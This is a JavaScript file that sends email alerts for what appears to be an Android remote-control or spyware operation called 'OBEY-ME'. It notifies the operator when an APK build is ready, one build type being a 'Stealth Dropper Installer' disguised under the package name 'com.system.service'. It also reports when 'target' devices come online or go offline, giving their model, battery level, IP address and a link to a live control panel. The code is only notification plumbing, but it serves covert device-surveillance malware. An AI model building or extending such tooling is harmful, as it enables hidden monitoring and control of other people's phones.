/**
 * OBEY-ME Realtime Automated Cloud Email Notification Service
 * Handles instant email notifications for:
 * 1. APK Build Finished & Ready
 * 2. Target Device Connected (ONLINE)
 * 3. Target Device Disconnected (OFFLINE)
 */

const EMAIL_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec";

// In-memory cache to prevent spamming notifications on quick reconnects
const emailNotificationCooldowns = {};
const NOTIFICATION_COOLDOWN_MS = 3 * 60 * 1000; // 3 Minutes per device

/**
 * Sends a rich HTML email notification via Google Mail Webhook & Cloud Gateway
 */
async function sendCloudEmailAlert(toEmail, subject, htmlBody, plainData = {}) {
    if (!toEmail || !toEmail.includes('@')) {
        console.warn('[EmailService] Invalid recipient email:', toEmail);
        return { success: false, error: 'Invalid recipient email' };
    }

    const cleanEmail = toEmail.trim().toLowerCase();
    let sent = false;

    // CHANNEL 1: Google Apps Script Webhook (Instant direct Gmail delivery)
    try {
        const payload = {
            action: "send_email",
            to: cleanEmail,
            subject: subject,
            htmlBody: htmlBody,
            timestamp: Date.now()
        };

        await fetch(EMAIL_WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        console.log(`[EmailService] ✉️ Channel 1 (Google Apps Script) dispatched to ${cleanEmail}: "${subject}"`);
        sent = true;
    } catch (err) {
        console.warn('[EmailService] Channel 1 error:', err);
    }

    // CHANNEL 2: Cloud FormSubmit Gateway Fallback
    try {
        const formPayload = {
            _subject: subject,
            _template: 'box',
            _captcha: 'false',
            Alert: subject,
            Recipient: cleanEmail,
            Time: new Date().toLocaleString(),
            Dashboard: 'https://mobile-control-pro.web.app/control.html',
            ...plainData
        };

        await fetch(`https://formsubmit.co/ajax/${cleanEmail}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formPayload)
        });
        console.log(`[EmailService] ✉️ Channel 2 (Cloud Gateway) dispatched to ${cleanEmail}`);
        sent = true;
    } catch (err2) {
        console.warn('[EmailService] Channel 2 error:', err2);
    }

    return { success: sent };
}

/**
 * Generates an Apple-style Liquid Dark Theme HTML Template
 */
function buildHtmlEmailTemplate({ title, badgeText, badgeColor, message, details = [], actionButton = null }) {
    const detailsHtml = details.map(d => `
        <tr>
            <td style="padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
                ${d.label}
            </td>
            <td style="padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
                ${d.value}
            </td>
        </tr>
    `).join('');

    const buttonHtml = actionButton ? `
        <div style="text-align: center; margin-top: 28px; margin-bottom: 10px;">
            <a href="${actionButton.url}" target="_blank" style="background: linear-gradient(135deg, ${actionButton.color || '#0071e3'} 0%, #005bb5 100%); color: #ffffff; text-decoration: none; padding: 13px 32px; font-size: 14px; font-weight: 700; border-radius: 980px; display: inline-block; box-shadow: 0 4px 20px rgba(0, 113, 227, 0.4); letter-spacing: 0.3px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
                ${actionButton.text} &rarr;
            </a>
        </div>
    ` : '';

    return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${title}</title>
    </head>
    <body style="margin: 0; padding: 24px 12px; background-color: #050507; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
        <div style="max-width: 560px; margin: 0 auto; background: #121217; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.8);">
            
            <!-- Header -->
            <div style="padding: 28px 24px; background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0) 100%); border-bottom: 1px solid rgba(255,255,255,0.08); text-align: center;">
                <div style="display: inline-block; padding: 4px 12px; background: ${badgeColor}22; border: 1px solid ${badgeColor}55; border-radius: 20px; font-size: 11px; font-weight: 700; color: ${badgeColor}; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px;">
                    ${badgeText}
                </div>
                <h1 style="margin: 0; font-size: 22px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px;">
                    ${title}
                </h1>
                <p style="margin: 8px 0 0 0; font-size: 14px; color: #a1a1a6; line-height: 1.5;">
                    ${message}
                </p>
            </div>

            <!-- Body Details -->
            <div style="padding: 24px;">
                <div style="background: rgba(255,255,255,0.03); border-radius: 14px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden;">
                    <table style="width: 100%; border-collapse: collapse;">
                        ${detailsHtml}
                    </table>
                </div>

                ${buttonHtml}
            </div>

            <!-- Footer -->
            <div style="padding: 16px 24px; background: rgba(0,0,0,0.3); border-top: 1px solid rgba(255,255,255,0.05); text-align: center;">
                <p style="margin: 0; font-size: 11px; color: #6e6e73;">
                    OBEY-ME Automated Cloud Command System • Real-Time Fleet Monitor
                </p>
                <p style="margin: 4px 0 0 0; font-size: 10px; color: #48484a;">
                    You are receiving this automated alert because email notifications are active for your account.
                </p>
            </div>

        </div>
    </body>
    </html>
    `;
}

/**
 * Triggers an email when an APK Build is finished
 */
async function notifyApkBuildComplete(toEmail, { appName, packageName, buildType, downloadUrl, userId }) {
    if (!toEmail) return;

    const timeStr = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka', hour12: true, dateStyle: 'medium', timeStyle: 'short' });
    const subject = `✅ [Ready] APK Build Complete: ${appName} (${userId})`;
    const html = buildHtmlEmailTemplate({
        title: "APK Build Successfully Completed",
        badgeText: "BUILD READY",
        badgeColor: "#30d158",
        message: `Your custom cloud APK package <strong>${appName}</strong> has finished compiling and is ready for installation.`,
        details: [
            { label: "Application Name", value: appName },
            { label: "Package Identifier", value: packageName || "com.system.service" },
            { label: "Build Type", value: buildType === 'dropper' ? "Stealth Dropper Installer" : "Standalone Main APK" },
            { label: "User UID", value: userId },
            { label: "Completion Time", value: timeStr + " (BST)" },
            { label: "Cloud Server Status", value: "⚡ Ready & Verified" }
        ],
        actionButton: {
            text: "📥 Download APK Now",
            url: downloadUrl || "https://mobile-control-pro.web.app/builder.html",
            color: "#0071e3"
        }
    });

    return await sendCloudEmailAlert(toEmail, subject, html, {
        Alert: "APK Build Successfully Completed",
        App_Name: appName,
        Package: packageName || "com.system.service",
        Build_Type: buildType === 'dropper' ? "Stealth Dropper Installer" : "Standalone Main APK",
        User_UID: userId,
        Completed_At: timeStr,
        Download_URL: downloadUrl || "https://mobile-control-pro.web.app/builder.html"
    });
}

/**
 * Triggers an email when a Target Device comes ONLINE
 */
async function notifyDeviceOnline(toEmail, deviceId, deviceData = {}) {
    if (!toEmail) return;

    // Cooldown check to prevent repeated emails if network reconnects rapidly
    const lastSent = emailNotificationCooldowns[`online_${deviceId}`] || 0;
    if (Date.now() - lastSent < NOTIFICATION_COOLDOWN_MS) {
        console.log(`[EmailService] Online email throttled for device ${deviceId} (Cooldown active)`);
        return;
    }
    emailNotificationCooldowns[`online_${deviceId}`] = Date.now();

    const model = deviceData.model || deviceData.manufacturer ? `${deviceData.manufacturer || ''} ${deviceData.model || ''}`.trim() : deviceId;
    const battery = deviceData.battery != null ? `${deviceData.battery}% ${deviceData.charging ? '⚡ (Charging)' : ''}` : 'Unknown';
    const osVersion = deviceData.android_version ? `Android ${deviceData.android_version}` : 'Android';
    const ip = deviceData.ip || 'Connected';
    const timeStr = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka', hour12: true, dateStyle: 'medium', timeStyle: 'short' });

    const subject = `🟢 [ONLINE] Device Connected: ${model} (${deviceId.substring(0, 8)})`;
    const html = buildHtmlEmailTemplate({
        title: "Target Device is Now Online",
        badgeText: "DEVICE CONNECTED",
        badgeColor: "#30d158",
        message: `Your device <strong>${model}</strong> has established a live connection with the Command Center.`,
        details: [
            { label: "Device Model", value: model },
            { label: "Device ID", value: deviceId },
            { label: "Battery Level", value: battery },
            { label: "OS Platform", value: osVersion },
            { label: "Network Address", value: ip },
            { label: "Connected At", value: timeStr + " (BST)" }
        ],
        actionButton: {
            text: "🎮 Open Live Control Panel",
            url: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`,
            color: "#30d158"
        }
    });

    return await sendCloudEmailAlert(toEmail, subject, html, {
        Alert: "Target Device Connected (ONLINE)",
        Device: model,
        Device_ID: deviceId,
        Battery: battery,
        OS_Platform: osVersion,
        IP_Address: ip,
        Connected_At: timeStr,
        Control_Panel: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`
    });
}

/**
 * Triggers an email when a Target Device goes OFFLINE
 */
async function notifyDeviceOffline(toEmail, deviceId, deviceData = {}) {
    if (!toEmail) return;

    // Cooldown check
    const lastSent = emailNotificationCooldowns[`offline_${deviceId}`] || 0;
    if (Date.now() - lastSent < NOTIFICATION_COOLDOWN_MS) {
        console.log(`[EmailService] Offline email throttled for device ${deviceId}`);
        return;
    }
    emailNotificationCooldowns[`offline_${deviceId}`] = Date.now();

    const model = deviceData.model || deviceData.manufacturer ? `${deviceData.manufacturer || ''} ${deviceData.model || ''}`.trim() : deviceId;
    const timeStr = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka', hour12: true, dateStyle: 'medium', timeStyle: 'short' });

    const subject = `🔴 [OFFLINE] Device Disconnected: ${model} (${deviceId.substring(0, 8)})`;
    const html = buildHtmlEmailTemplate({
        title: "Target Device Went Offline",
        badgeText: "DEVICE DISCONNECTED",
        badgeColor: "#ff453a",
        message: `Connection lost with <strong>${model}</strong>. The device is currently unreachable or powered off.`,
        details: [
            { label: "Device Model", value: model },
            { label: "Device ID", value: deviceId },
            { label: "Last Seen", value: timeStr + " (BST)" },
            { label: "Status", value: "Offline / Disconnected" }
        ],
        actionButton: {
            text: "🔍 View Device History",
            url: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`,
            color: "#ff453a"
        }
    });

    return await sendCloudEmailAlert(toEmail, subject, html, {
        Alert: "Target Device Disconnected (OFFLINE)",
        Device: model,
        Device_ID: deviceId,
        Last_Seen: timeStr,
        Status: "Offline / Disconnected",
        Control_Panel: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`
    });
}

// Attach to window for global access across all pages
if (typeof window !== 'undefined') {
    window.sendCloudEmailAlert = sendCloudEmailAlert;
    window.notifyApkBuildComplete = notifyApkBuildComplete;
    window.notifyDeviceOnline = notifyDeviceOnline;
    window.notifyDeviceOffline = notifyDeviceOffline;
}
